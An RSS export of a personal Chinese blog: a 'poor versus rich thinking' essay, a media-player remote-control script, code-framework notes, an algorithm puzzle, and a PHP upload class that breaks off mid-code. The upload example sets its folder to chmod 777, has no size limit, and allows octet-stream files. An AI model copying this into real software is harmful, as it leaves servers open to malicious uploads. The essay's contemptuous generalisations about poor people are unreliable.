<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp; 穷人：学手艺。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;富人：学管理。 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp; 5.时间</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp; 穷人：一个享受充裕时间的人不可能挣大钱，要想悠闲轻松就会失去更多挣钱的机会。穷人的时间不值钱的，有时甚至多余，不知道怎么打发，怎么混起来才不烦。如果你可以因为买一斤白菜多花了一毛钱而气恼不已，却不为虚度一天而心痛，这就是典型的穷人思维。&nbsp;</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：一个人无论以何种方式挣钱，也无论钱挣得是多是少，都必须经过时间的积淀。富人的玩也是一种工作方式，是有目的的。富人的闲，闲在身体，修身养性，以利再战，脑袋一刻也没有闲着；穷人的闲，闲在思想，他手脚都在忙，忙着去麻将桌上多摸几把。 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 6.归属感</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 穷人：是颗螺丝钉。穷人因为自身的卑微，缺少安全感，就迫切地希望自己从属并依赖于一个团体。于是他们以这个团体的标准为自己的标准，让自己的一切合乎规范，为团体的利益而工作，奔波，甚至迁徙。对于穷人来说，在一个著名的企业里稳定地工作几十年，由实习生一直干到高级主管，那简直是美妙得不能再美妙的理想了。&nbsp;</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：那些团体的领导者通常都是富人，他们总是一方面向穷人灌输：团结就是力量，如果你不从属于自己这个团体，你就什么都不是，一文不名。但另一方面，他们却从来没有停止过招兵买马，培养新人，以便随时可以把你替换。&nbsp;</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp;7.投资及对待财富</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp;穷人：经典观点就是少用就等于多赚。比如开一家面馆，收益率是100%，投入2万，一年就净赚2万，对穷人来说很不错了。穷人即使有钱，也舍不得拿出来，即使终于下定决心投资，也不愿冒风险，最终还是走不出那一步。穷人最津津乐道的就是鸡生蛋，蛋生鸡，一本万利……但是建筑在一只母鸡身上的希望，毕竟是那样脆弱。 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：富人的出发点是万本万利。同样的开面馆，富人们会想，一家面馆承载的资本只有2万，如果有1亿资金，岂不是要开5000家面馆？要一个一个管理好，大老板得操多少心，累白多少根头发呀？还不如投资宾馆，一个宾馆就足以消化全部的资本，哪怕收益率只有20%，一年下来也有2000万利润啊！&nbsp;</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 8.激情 能不能干成大事，首先要看有没有激情 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 穷人：没有激情。他总是按部就班，很难出大错，也绝不会做最好。没有激情就无法兴奋，就不可能全心全意投入工作，大部分的穷人不能说没有激情，但他的激情总是消耗在太具体的事情上；上司表扬了，他会激动；商店打折了，他会激动；电视里破镜重圆了，他的眼泪一串一串往XL，穷人有的只是一种情绪。&nbsp;</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：“燕雀安知鸿鹄之志？”“王侯将相，宁有种乎？”有这样的激情，穷人终将不是穷人！激情是一种天性，是生命力的象征，有了激情，才有了灵感的火花，才有了鲜明的个性，才有了人际关系中的强烈感染力，也才有了解决问题的魅力和方法。&nbsp;</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp;&nbsp;9.自信 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 穷人：穷人的自信要通过武装到牙齿，要通过一身高级名牌的穿戴和豪华的配饰才能给他们带来更多的自信，穷人的自信往往不是发自内心和自然天成的。&nbsp;</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：李嘉诚在谈到他的经营秘诀时说：“其实也没什么特别的，光景好时，决不过分乐观；光景不好时，也不过度悲观”。其实就是一种富人特有的自信。自信才能不被外力所左右，自信才可能有正确的决定。 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 10.习惯 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 穷人：有个故事，一个富人送给穷人一头牛。穷人满怀希望开始奋斗。可牛要吃草，人要吃饭，日子很难。穷人于是把牛卖了，买了几只羊，吃了一只，剩下的来生小羊。可小羊迟迟没有生下来，日子又艰难了。穷人又把羊卖了，买成鸡。想让鸡生蛋赚钱为生，但是日子并没有改变，最后穷人把鸡也杀了，穷人的理想彻底崩溃了。这就是穷人的习惯。&nbsp;</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：据一个投资专家说，富人成功秘诀就是：没钱时，不管多困难，也不要动用投资和积蓄，压力使你找到赚钱的新方法，帮你还清账单。这是个好习惯。性格形成习惯，习惯决定成功。 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 11.上网络</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 穷人：上网聊天。穷人聊天，一是穷人时间多，二是穷人的嘴天生就不能闲着。富人讲究荣辱不惊，温柔敦厚，那叫涵养，有涵养才能树大根深。穷人就顾不了那么多，成天受着别人的白眼，浑身沾满了鸡毛蒜皮，多少窝囊气啊，说说都不行？聊天有理！ </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：上网找投资机会。富人上网，更多的是利用网络的低成本高效率，寻找更多的投资机会和项目，把便利运用到自己的生意中来。 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 12.消费花钱</P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 穷人：买名牌是为了体验满足感，最喜欢试验刚出来的流行时尚产品，相信贵的必然是好的。 </P>
<P style="TEXT-INDENT: 2em">&nbsp;&nbsp;&nbsp; 富人：买名牌是为了节省挑选细节的时间，与消费品的售价相比，他们更在乎产品的质量，比如会买15元的纯棉T恤，也不会买昂贵的莱卡制品</P>
<P style="TEXT-INDENT: 2em"></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720083249387801/</guid>
    </item>
    <item>
      <title>
<![CDATA[Bluetooth Remote Control 脚本]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008432047466/</link>
      <description>
<![CDATA[<P>工具 Microsoft Spy++，测试消息函数，打开应用程序，然后打开spy++，在spy++里找到对应的程序，然后Ctrl+M打开Message设置窗口，只选择WM_COMMAND，然后在应用程序里执行操作，Spy++里就会有相应的消息，查看得到的值就知道SendMessage函数的参数了。</P>
<P>关于启动应用程序，</P>
<P>方法一，CreateObject(objectName)，这个参数是从注册表里找到的，HKEY_CLASSES_ROOT/CLSID里找。</P>
<P>方法二， Dim&nbsp;oShell；Set oShell=WScript.CreateObject("WSCript.shell")&nbsp;； oShell.run command；</P>
<P>Set&nbsp;oShell &nbsp; = &nbsp; Nothing</P>
<P>//Global variables<BR>var brcActivate = 1, brcBack = 3, brcKeyPress = 5;<BR>var windowClassName = "WMPlayerApp";<BR>var Stop = 1, Play = 2, Pause = 3;<BR>var CRLF = "\r\n";</P>
<P>//Start executing main method<BR>main();<BR>&nbsp;//************************* Functions **************************<BR>function main()<BR>{<BR>&nbsp;//1. Detect which action that we have received<BR>&nbsp;switch (BRCD.Action)<BR>&nbsp;{<BR>&nbsp;&nbsp;case brcActivate:<BR>&nbsp;&nbsp;&nbsp;//Add timer object to detect changes done on PC<BR>&nbsp;&nbsp;&nbsp;break; <BR>&nbsp;&nbsp;case brcBack:<BR>&nbsp;&nbsp;&nbsp;BRC.UnLoad();<BR>&nbsp;&nbsp;&nbsp;return; <BR>&nbsp;&nbsp;&nbsp;break; <BR>&nbsp;&nbsp;case brcKeyPress:<BR>&nbsp;&nbsp;&nbsp;KeyPress();<BR>&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;default:<BR>&nbsp;}<BR>&nbsp;//2. Update display<BR>&nbsp;update();<BR>}<BR>function KeyPress()<BR>{<BR>&nbsp;switch (BRCD.Key)<BR>&nbsp;{<BR>&nbsp;&nbsp; case "1":<BR>&nbsp;&nbsp;&nbsp;//Write text in the debug window!<BR>&nbsp;&nbsp;&nbsp;BRC.Debug("Play");</P>
<P>&nbsp;&nbsp; // got from spy++<BR>&nbsp;&nbsp;&nbsp;BRC.SendMessage(windowClassName,0x111, 18808, 0);<BR>&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;case "2":<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; BRC.Debug("Pause");<BR>&nbsp;&nbsp;&nbsp;BRC.SendMessage(windowClassName,0x111, 18808, 0);<BR>&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;case "3":<BR>&nbsp;&nbsp;&nbsp;BRC.Debug("Stop");<BR>&nbsp;&nbsp;&nbsp;BRC.SendMessage(windowClassName,0x111, 18809, 0);<BR>&nbsp;&nbsp;&nbsp;break;<BR>&nbsp;&nbsp;default:<BR>&nbsp;}<BR>}<BR>function update()<BR>{<BR>&nbsp;var status;<BR>&nbsp;var text;</P>
<P>&nbsp;status = BRC.SendMessage(windowClassName,0x400, 0, 104);<BR>&nbsp;if(status == 0) <BR>&nbsp;{<BR>&nbsp;&nbsp;BRC.go_Button = Stop;<BR>&nbsp;}<BR>&nbsp;else if (status == 3)<BR>&nbsp;{<BR>&nbsp;&nbsp;BRC.go_Button = Pause;<BR>&nbsp;}<BR>&nbsp;else <BR>&nbsp;{<BR>&nbsp;&nbsp;BRC.go_Button = Play;<BR>&nbsp;}</P>
<P>&nbsp;//Do not reflect the correct position only for a nicer UI<BR>&nbsp;BRC.go_Duration = 100;<BR>&nbsp;BRC.go_PlayerPostion = 20;</P>
<P>&nbsp;//Construct a string with modifiers for UI control<BR>&nbsp;text = "&lt;b&gt;&lt;l&gt;Simple WinAMP" + CRLF +"&lt;s&gt;WinAMP must be running"; <BR>&nbsp;text = text + CRLF + CRLF + "&lt;s&gt;1: Play" + CRLF + "&lt;s&gt;2: Pause" + CRLF + "&lt;s&gt;3: Stop";<BR>&nbsp;BRC.DisplayDialog(text);<BR>}</P>
<P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008432047466/</guid>
    </item>
    <item>
      <title>
<![CDATA[JISP代码框架研究]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200782782651703/</link>
      <description>
<![CDATA[<P>核心</P>
<P>&nbsp; ObjectDatabaseFile</P>
<P>&nbsp; IndexedObjectDatabase</P>
<P>I/O</P>
<P>&nbsp; SerialObjectOutputStream</P>
<P>&nbsp; SerialObjectInputStream</P>
<P>&nbsp; ObjectByteInputStream</P>
<P>算法</P>
<P>&nbsp; BTreeIndex</P>
<P>&nbsp; Huffman*</P>
<P>&nbsp; Hash*</P>
<P>异常</P>
<P>&nbsp; KeyNotFound</P>
<P>&nbsp; DuplicateKey</P>
<P>将数据的index和data分开存储，存储格式固定，和实现Session的TSQ中比较相近。</P>
<P>这个系统比较注重算法和效率，因此用Java来写比较别扭，比如HuffmanHeader，BTreeShared其实就是C中的头文件的模式。这也是JISP停止开发，转成C++的Itzam的原因吧。</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200782782651703/</guid>
    </item>
    <item>
      <title>
<![CDATA[编程珠玑]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201092105811673/</link>
      <description>
<![CDATA[第二章的一道题：<br>有一个文件，保存着很多1-2^32之间的无序数，其中至少有一个没有出现，如何找出其中一个？<br><br>当时想到基数排序的思想，分别把第10位为1，2，3，4，5，6，7，8，9，0的数写入1.txt 2.txt ... 0.txt 的十个文件中，并分别计算第个文件的记录条数，如果哪个文件小于理论值，则表示这个文件中缺少，然后再分别对第9、8、7...1位进行处理，最后就能找到这样一个值。<br><br>然后看书上给出的算法，使用二分查找的思想，需要32次，感觉也很不错。<br><br>再想一下，用基数排序的话，只要10轮就行了，好像比二分更快些。再想一下，其实是一样的思想，完全可以采用更大的基数，比如将1-2^32分成n份，分别计算每段内的理论值和实际值。。。<br><br>其实就是划分子问题的基本思想啊。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201092105811673/</guid>
    </item>
    <item>
      <title>
<![CDATA[PHP的文件上传类]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200942744129261/</link>
      <description>
<![CDATA[一共用到三个文件： html页面，php页面，php文件上传类<br>//1. upload.html<br>&lt;form enctype="multipart/form-data" action="doupload.php" method="POST"&gt;<br>&lt;input name="uploadinput[]" type="file"&gt;&lt;br/&gt;<br>&lt;input name="uploadinput[]" type="file"&gt;&lt;br/&gt;<br>&lt;input name="uploadinput[]" type="file"&gt;&lt;br/&gt;<br>&lt;input name="uploadinput[]" type="file"&gt;&lt;br/&gt;<br>&lt;input name="submit" type="submit" value="Upload"&gt;<br>&amp;nbsp;&amp;nbsp;<br>&lt;input name="reset" type="reset" value="Clear"&gt;<br>&lt;/form&gt;<br><br>//2. doupload.php<br>&lt;?php<br>require_once("function/upload.php");<br>$fileFormat = array('jpg','png','gif','bmp');//支持的上传文件类型<br>$savepath = "upload/";// 上传的文件存放目录,注:chmod 777 upload<br>$maxsize = 0; //上传文件大小限制<br>$overwrite=0; //0. no 1. yes<br>$f = new Upload( $savepath, $fileFormat, $maxsize, $overwrite);<br>if (!$f-&gt;run('uploadinput')){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo $f-&gt;errmsg();<br>}<br>print_r($f-&gt;returnArray);<br>?&gt;<br><br>//3. upload.php<br>&lt;?php<br>/*<br>HTML Sample:<br>&lt;form enctype="multipart/form-data" action="upload.php" method="POST"&gt;<br>Send this file: &lt;br&gt;<br>&lt;input name="uploadinput[]" type="file"&gt;&lt;br&gt;<br>&lt;input name="uploadinput[]" type="file"&gt;&lt;br&gt;<br>&lt;input name="uploadinput[]" type="file"&gt;&lt;br&gt;<br>&lt;input type="submit" value="Send File"&gt;<br>&lt;/form&gt;<br><br>PHP Sample:<br>$fileFormat = array('application/octet-stream');<br>$savepath = "upload/";&nbsp;&nbsp;// 文件上传目录，<br>$maxsize = 0;&nbsp; &nbsp; //文件最大字节，0 表示无限制，但受php.ini中upload_max_filesize设置影响<br>$overwrite = 0;&nbsp;&nbsp;// 覆盖 0 不允许&nbsp;&nbsp;1 允许<br>$f = new Upload( $savepath, $fileFormat, $maxsize, $overwrite);<br>if (!$f-&gt;run('uploadinput')){//下面的uploadinput是Form中上传文件的input的名字<br>&nbsp; &nbsp;echo $f-&gt;errmsg();&nbsp;&nbsp;//这里只能传递最后一个出错的信息，详细的信息在$f-&gt;getInfo()中可以得到。<br>}<br>print_r($f-&gt;returnArray);<br>*/<br>class Upload{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; var $saveName;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; var $savePath;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; var $fileFormat = array("gif","jpg","doc","application/octet-stream");// 文件格式&amp;MIME限定<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; var $overwrite = 0;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; var $maxSize = 0;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; var $ext; // 文件扩展名<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; var $type;// 文件类型<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; var $errno;// 错误代号<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; var $returnArray= array(); // 所有文件的返回信息<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; var $returninfo= array();// 每个文件返回信息<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; //构造函数<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // @param savePath 文件保存路径<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // @param fileFormat 文件格式限制数组<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // @param maxSize 文件最大尺寸<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // @param overwriet 是否覆盖 1 允许覆盖 0 禁止覆盖<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function Upload($savePath, $fileFormat='',$maxSize = 0, $overwrite = 0) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;setSavepath($savePath);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;setFileformat($fileFormat);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;setMaxsize($maxSize);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;setOverwrite($overwrite);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;errno = 0;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br><br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; // 上传<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; function run($fileInput,$changeName = 1){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(isset($_FILES[$fileInput])){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $fileArr = $_FILES[$fileInput];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if(is_array($fileArr['name'])) {//上传同文件域名称多个文件<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; for($i = 0; $i &lt; count($fileArr['name']); $i++) {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if ($fileArr['tmp_name'][$i]!='') {<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $ar['tmp_name'] = $fileArr['tmp_name'][$i];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $ar['name'] = $fileArr['name'][$i];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $ar['type'] = $fileArr['type'][$i];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $ar['size'] = $fileArr['size'][$i];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $ar['error'] = $fileArr['error'][$i];<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;getExtType($ar);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;setSavename($changeName == 1 ? '' : $ar['name']);<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if($this-&gt;copyfile($ar)){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;returnArray[]=$this-&gt;returninfo;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else{<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; $this-&gt;returninfo['error'] = $this-&gt;errmsg();<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp; $this-&gt;returnArray[]=$this-&gt;returninfo;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return $this-&gt;errno ?&nbsp;&nbsp;false :&nbsp;&nbsp;true;<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; else {//上传单个文件<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;getExtType($fileArr);//取得扩展名和类型<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; $this-&gt;setSavename($changeName == 1 ? '' : $fileArr['name']);//设置保存文件名<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if($this-&gt;copyfile($fileArr)){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 